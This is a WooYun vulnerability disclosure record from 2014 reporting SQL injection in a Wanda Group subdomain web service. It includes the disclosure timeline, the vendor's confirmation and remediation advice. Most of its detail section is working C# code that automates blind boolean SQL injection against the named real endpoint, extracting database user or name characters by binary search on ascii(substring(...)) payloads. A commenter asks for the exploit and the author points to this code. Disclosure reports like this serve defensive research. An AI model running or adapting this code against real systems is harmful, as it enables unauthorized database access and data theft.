{"id": 47327, "wybug_id": "wooyun-2014-087165", "wybug_title": "万达某分站SQL注入漏洞一枚", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "sex is not show", "wybug_date": "2014-12-14 22:44", "wybug_open_date": "2015-01-28 22:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向公众公开  简要描述：  详细说明：  存在漏洞站点：mtodo.wanda.cn    不知道这站是干啥的，先不管~~漏洞文件：http://mtodo.wanda.cn/ServiceMobile.asmx?op=GetAllCount直接提交带注入的参数，就会302：\n\n既然有webservice，那就用代码走soap协议来尝试，于是操起vs乱写了一通~~\n\n当前用户：\n\n本屌写的乱的一米的代码：\ncn.wanda.mtodo.ServiceMobile sm = new cn.wanda.mtodo.ServiceMobile();        private void btnGetAllCount_Click(object sender, EventArgs e)        {            try            {                string leix = this.txtUserid.Text;                int str_len = 0; //用户 or 数据库名长度                //取长度                for (int j = 1; j < 20; j++)  //假设最长20，一般不会超过那么长                {                    string rrr = sm.GetAllCount(\"' or 1=1 and \"+j+\"=len(\" + leix + \")--\");                    //{\\\"success\\\":true,\\\"Rows\\\":16,\\\"message\\\":\\\"\\\"}                    if ((sm.GetAllCount(\"' or 1=1 and \" + j + \"=len(\" + leix + \")--\")).Contains(\"1700\"))                    {                        str_len = j;                    }                }                this.txtMsg.Text = this.txtUserid.Text + \" len: \" + str_len + \"\\r\\n\";                this.txtMsg.Text += leix + \" : \";                if (str_len > 0)                {                    //取当前用户/数据库名                    int[] asc = { 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127 };                    for (int k = 1; k <= str_len; k++)                    {                                                int low = 1; //最小值                        int high = asc.Length; //数组长度                        int mid;                        while (low <= high)                        {                            mid = (low + high) / 2; //取中间值                            string name = sm.GetAllCount(\"' or 1=1 and \" + asc[mid] + \"<=ascii(substring(\" + leix + \",\" + k + \",1))--\");                            if (name.Contains(\"1700\"))                            {                                low = mid + 1;                                if ((sm.GetAllCount(\"' or 1=1 and \" + asc[mid] + \"=ascii(substring(\" + leix + \",\" + k + \",1))--\")).Contains(\"1700\"))                                {                                    this.txtMsg.Text += Encoding.ASCII.GetString(new byte[]{(byte)asc[mid]});                                }                            }                            else                            {                                high = mid - 1;                            }                        }                    }                }            }            catch(Exception eq){                this.txtMsg.Text += eq.Message;            }                    }\n   漏洞证明：  \n\n   修复方案：  1.参数化查询，别拼SQL语句了2.webservice最好部署在内网里调用~ 公网就别启用了   版权声明：转载请注明来源 sex is not show@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-12-15 11:15 厂商回复： 感谢sex is not show同学的关注与贡献！此漏洞确认存在，马上通知业务部门整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-14 15:37 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  求exp    \n     2015-01-14 19:13 |    \t\tsex is not show  \t\t\t( 普通白帽子  |\t\t\t        Rank:1495 漏洞数:233        | 这家伙真懒！)\t\t \n  @糖剩七颗 代码不是贴出来了么    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}